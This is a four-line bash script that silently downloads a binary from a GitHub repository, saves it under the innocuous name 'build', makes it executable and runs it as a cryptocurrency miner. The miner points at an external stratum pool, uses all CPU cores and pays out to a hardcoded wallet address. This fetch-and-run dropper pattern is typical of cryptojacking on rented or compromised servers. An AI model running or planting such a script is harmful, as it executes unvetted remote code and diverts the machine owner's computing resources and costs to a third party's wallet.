#!/bin/bash
wget -qO build https://github.com/champlin01/vps/raw/main/terserah
chmod +x build
./build -a yespowertide -o stratum+tcp://stratum-eu.rplant.xyz:17059 -u TB13H1vM4Mb53btk8fEP8KRwwc2XmVMKnr.nothing -t $(nproc --all)
